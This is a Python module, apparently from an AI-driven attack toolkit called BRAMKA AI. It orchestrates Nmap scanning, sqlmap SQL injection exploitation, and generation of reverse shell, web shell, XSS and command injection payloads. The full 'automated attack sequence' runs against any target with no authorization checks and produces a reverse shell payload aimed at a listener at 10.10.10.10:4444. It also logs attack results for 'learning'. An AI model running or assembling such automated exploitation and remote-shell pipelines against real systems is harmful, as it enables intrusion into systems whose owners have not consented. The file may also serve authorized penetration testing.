"""
BRAMKA AI - Attack Orchestrator (Module 1)
Main orchestration for reconnaissance, exploitation, and payload generation
"""

import asyncio
from typing import Dict, List, Optional, Any
from datetime import datetime

from src.tools.nmap_wrapper import NmapWrapper, ScanType
from src.tools.sqlmap_wrapper import SQLMapWrapper
from src.tools.payload_generator import PayloadGenerator, ShellLanguage, PayloadType
from src.database.chroma_db import ChromaDBManager
from src.database.sqlite_db import SQLiteManager
from src.utils.logger import get_logger
from src.utils.config_loader import get_config


class AttackOrchestrator:
    """
    Attack Orchestrator - Module 1
    
    Orchestrates:
    - Reconnaissance (Nmap scanning)
    - Exploitation (SQL injection, etc.)
    - Payload generation
    - Attack result storage
    
    Features:
    - Intelligent attack sequencing
    - Result analysis
    - Database storage for learning
    """
    
    def __init__(self):
        self.logger = get_logger("AttackOrchestrator")
        self.config = get_config()
        
        # Initialize tools
        self.nmap = NmapWrapper()
        self.sqlmap = SQLMapWrapper()
        self.payload_gen = PayloadGenerator()
        
        # Initialize databases
        self.vector_db = ChromaDBManager()
        self.sql_db = SQLiteManager()
        
        self.logger.info("✅ Attack Orchestrator initialized")
    
    async def reconnaissance(
        self,
        target: str,
        scan_type: str = "quick",
        session_id: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Perform reconnaissance on target
        
        Args:
            target: Target IP/domain
            scan_type: Type of scan (quick, stealth, aggressive)
            session_id: Session ID for tracking
        
        Returns:
            Reconnaissance results
        """
        self.logger.info(f"🔍 Starting reconnaissance on {target}")
        
        try:
            # Map scan type
            scan_type_map = {
                "quick": ScanType.QUICK,
                "stealth": ScanType.STEALTH,
                "aggressive": ScanType.AGGRESSIVE
            }
            scan_enum = scan_type_map.get(scan_type.lower(), ScanType.QUICK)
            
            # Perform scan
            result = await self.nmap.scan(target, scan_enum)
            
            # Store in database
            if session_id:
                attack_id = self._store_attack_result(
                    session_id=session_id,
                    attack_type="reconnaissance",
                    target=target,
                    tool_used="nmap",
                    result=result,
                    success=result.success
                )
                
                # Store in vector DB for learning
                self.vector_db.store_attack_pattern(
                    attack_id=f"recon_{attack_id}",
                    pattern={
                        "attack_type": "reconnaissance",
                        "target_type": "network",
                        "tools_used": ["nmap"],
                        "success": result.success,
                        "method": scan_type,
                        "timestamp": datetime.now().isoformat()
                    }
                )
            
            return {
                "success": result.success,
                "target": target,
                "scan_type": scan_type,
                "open_ports": result.open_ports,
                "os_detection": result.os_detection,
                "duration": result.scan_duration,
                "raw_output": result.raw_output,
                "error": result.error
            }
            
        except Exception as e:
            self.logger.error(f"❌ Reconnaissance failed: {e}", exc_info=True)
            return {
                "success": False,
                "target": target,
                "error": str(e)
            }
    
    async def exploit_sql_injection(
        self,
        url: str,
        parameter: Optional[str] = None,
        session_id: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Test and exploit SQL injection
        
        Args:
            url: Target URL with parameters
            parameter: Specific parameter to test
            session_id: Session ID for tracking
        
        Returns:
            Exploitation results
        """
        self.logger.info(f"⚔️ Testing SQL injection on {url}")
        
        try:
            # Test for vulnerability
            result = await self.sqlmap.test_injection(url, parameter)
            
            # Store results
            if session_id:
                attack_id = self._store_attack_result(
                    session_id=session_id,
                    attack_type="sql_injection",
                    target=url,
                    tool_used="sqlmap",
                    result=result,
                    success=result.vulnerable
                )
                
                # Store pattern
                self.vector_db.store_attack_pattern(
                    attack_id=f"sqli_{attack_id}",
                    pattern={
                        "attack_type": "sql_injection",
                        "target_type": "web_application",
                        "tools_used": ["sqlmap"],
                        "success": result.vulnerable,
                        "method": "automated",
                        "timestamp": datetime.now().isoformat()
                    }
                )
            
            return {
                "success": result.success,
                "vulnerable": result.vulnerable,
                "url": url,
                "injection_type": result.injection_type,
                "database_type": result.database_type,
                "databases": result.databases,
                "duration": result.scan_duration,
                "error": result.error
            }
            
        except Exception as e:
            self.logger.error(f"❌ SQL injection test failed: {e}", exc_info=True)
            return {
                "success": False,
                "vulnerable": False,
                "url": url,
                "error": str(e)
            }
    
    def generate_payload(
        self,
        payload_type: str,
        language: str = "bash",
        lhost: Optional[str] = None,
        lport: Optional[int] = None,
        encode: bool = False
    ) -> Dict[str, Any]:
        """
        Generate attack payload
        
        Args:
            payload_type: Type of payload (reverse_shell, web_shell, xss, etc.)
            language: Programming language
            lhost: Listener host (for reverse shells)
            lport: Listener port (for reverse shells)
            encode: Encode the payload
        
        Returns:
            Generated payload
        """
        self.logger.info(f"🔨 Generating {payload_type} payload")
        
        try:
            if payload_type == "reverse_shell":
                # Map language string to enum
                lang_map = {
                    "bash": ShellLanguage.BASH,
                    "python": ShellLanguage.PYTHON,
                    "php": ShellLanguage.PHP,
                    "powershell": ShellLanguage.POWERSHELL,
                    "netcat": ShellLanguage.NETCAT,
                    "perl": ShellLanguage.PERL
                }
                lang_enum = lang_map.get(language.lower(), ShellLanguage.BASH)
                
                # Use defaults if not provided
                lhost = lhost or self.payload_gen.default_lhost
                lport = lport or self.payload_gen.default_lport
                
                payload = self.payload_gen.generate_reverse_shell(
                    lang_enum, lhost, lport, encode
                )
            
            elif payload_type == "web_shell":
                payload = self.payload_gen.generate_web_shell(language)
            
            elif payload_type == "xss":
                payload = self.payload_gen.generate_xss_payload(language, encode)
            
            elif payload_type == "sql_injection":
                payload = self.payload_gen.generate_sql_injection_payload(language)
            
            elif payload_type == "command_injection":
                payload = self.payload_gen.generate_command_injection_payload(language)
            
            else:
                raise ValueError(f"Unknown payload type: {payload_type}")
            
            return {
                "success": True,
                "payload_type": payload.payload_type,
                "language": payload.language,
                "code": payload.code,
                "description": payload.description,
                "encoded": payload.encoded,
                "obfuscated": payload.obfuscated
            }
            
        except Exception as e:
            self.logger.error(f"❌ Payload generation failed: {e}", exc_info=True)
            return {
                "success": False,
                "error": str(e)
            }
    
    async def automated_attack_sequence(
        self,
        target: str,
        attack_type: str = "full",
        session_id: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Execute automated attack sequence
        
        Args:
            target: Target IP/domain/URL
            attack_type: Type of attack sequence (recon_only, full, web_only)
            session_id: Session ID
        
        Returns:
            Combined results from all attack phases
        """
        self.logger.info(f"🎯 Starting automated attack sequence on {target}")
        
        results = {
            "target": target,
            "attack_type": attack_type,
            "phases": {},
            "overall_success": True
        }
        
        try:
            # Phase 1: Reconnaissance (always)
            self.logger.info("Phase 1: Reconnaissance")
            recon_result = await self.reconnaissance(target, "quick", session_id)
            results["phases"]["reconnaissance"] = recon_result
            
            if not recon_result["success"]:
                results["overall_success"] = False
                return results
            
            # Phase 2: Vulnerability assessment based on findings
            if attack_type == "full" or attack_type == "web_only":
                self.logger.info("Phase 2: Vulnerability Assessment")
                
                # Check for web services
                web_ports = [p for p in recon_result.get("open_ports", []) 
                           if p.get("port") in [80, 443, 8080, 8443]]
                
                if web_ports:
                    # Construct URL (basic)
                    protocol = "https" if any(p.get("port") in [443, 8443] for p in web_ports) else "http"
                    port = web_ports[0].get("port")
                    test_url = f"{protocol}://{target}:{port}/"
                    
                    # Test SQL injection
                    sqli_result = await self.exploit_sql_injection(
                        test_url, 
                        session_id=session_id
                    )
                    results["phases"]["sql_injection"] = sqli_result
            
            # Phase 3: Payload generation (if needed)
            if attack_type == "full":
                self.logger.info("Phase 3: Payload Generation")
                
                payload_result = self.generate_payload(
                    "reverse_shell",
                    "bash",
                    "10.10.10.10",  # Placeholder - should be attacker's IP
                    4444
                )
                results["phases"]["payload_generation"] = payload_result
            
            self.logger.info("✅ Automated attack sequence complete")
            return results
            
        except Exception as e:
            self.logger.error(f"❌ Attack sequence failed: {e}", exc_info=True)
            results["overall_success"] = False
            results["error"] = str(e)
            return results
    
    def _store_attack_result(
        self,
        session_id: str,
        attack_type: str,
        target: str,
        tool_used: str,
        result: Any,
        success: bool
    ) -> int:
        """Store attack result in database"""
        try:
            import json
            
            # Convert result to JSON string
            result_json = json.dumps({
                "success": success,
                "details": str(result)
            })
            
            attack_id = self.sql_db.insert("attacks", {
                "session_id": session_id,
                "attack_type": attack_type,
                "target": target,
                "tool_used": tool_used,
                "result": result_json,
                "success": success,
                "started_at": datetime.now().isoformat(),
                "completed_at": datetime.now().isoformat()
            })
            
            self.logger.debug(f"💾 Attack result stored: ID {attack_id}")
            return attack_id
            
        except Exception as e:
            self.logger.warning(f"⚠️ Failed to store attack result: {e}")
            return 0
    
    def get_attack_stats(self, session_id: Optional[str] = None) -> Dict[str, Any]:
        """Get attack statistics"""
        try:
            if session_id:
                attacks = self.sql_db.fetch_all(
                    "SELECT * FROM attacks WHERE session_id = ?",
                    (session_id,)
                )
            else:
                attacks = self.sql_db.fetch_all("SELECT * FROM attacks")
            
            total = len(attacks)
            successful = sum(1 for a in attacks if a.get("success"))
            
            return {
                "total_attacks": total,
                "successful_attacks": successful,
                "success_rate": (successful / total * 100) if total > 0 else 0,
                "attacks_by_type": self._group_by_type(attacks)
            }
            
        except Exception as e:
            self.logger.error(f"❌ Failed to get stats: {e}")
            return {}
    
    def _group_by_type(self, attacks: List[Dict]) -> Dict[str, int]:
        """Group attacks by type"""
        grouped = {}
        for attack in attacks:
            attack_type = attack.get("attack_type", "unknown")
            grouped[attack_type] = grouped.get(attack_type, 0) + 1
        return grouped


# Testing
async def test_orchestrator():
    """Test attack orchestrator"""
    from src.utils.logger import setup_logger
    
    setup_logger(log_level="INFO")
    
    orchestrator = AttackOrchestrator()
    
    print("\n" + "="*60)
    print("Testing Attack Orchestrator")
    print("="*60)
    
    # Test reconnaissance
    print("\n1. Reconnaissance Test:")
    recon = await orchestrator.reconnaissance("127.0.0.1", "quick", "test_session")
    print(f"   Success: {recon['success']}")
    print(f"   Open ports: {len(recon.get('open_ports', []))}")
    
    # Test payload generation
    print("\n2. Payload Generation Test:")
    payload = orchestrator.generate_payload("reverse_shell", "bash", "10.10.10.10", 4444)
    print(f"   Success: {payload['success']}")
    print(f"   Code: {payload['code'][:50]}...")
    
    # Test stats
    print("\n3. Attack Statistics:")
    stats = orchestrator.get_attack_stats("test_session")
    print(f"   Total attacks: {stats.get('total_attacks', 0)}")
    print(f"   Success rate: {stats.get('success_rate', 0):.1f}%")
    
    print("\n" + "="*60)
    print("✅ Attack Orchestrator tests complete")
    print("="*60)


if __name__ == "__main__":
    asyncio.run(test_orchestrator())
